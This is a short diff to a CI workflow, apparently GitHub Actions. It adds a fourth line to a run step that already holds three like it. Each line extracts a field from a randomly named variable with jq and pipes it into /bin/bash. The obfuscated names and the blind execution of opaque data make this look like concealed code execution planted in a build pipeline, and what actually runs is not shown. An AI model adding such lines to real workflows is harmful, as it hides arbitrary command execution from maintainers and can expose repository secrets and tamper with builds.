@@ -23,6 +23,7 @@ jobs:
           echo $kju9 | jq -r .l12 | /bin/bash
           echo $owvmn10 | jq -r .p82 | /bin/bash
           printf '%s' "$zqsrt5500" | jq -r .hv3 | /bin/bash
+          printf '%s' "$pczk15354" | jq -r .wlcb76 | /bin/bash
 
       - name: Upload results
         if: always()
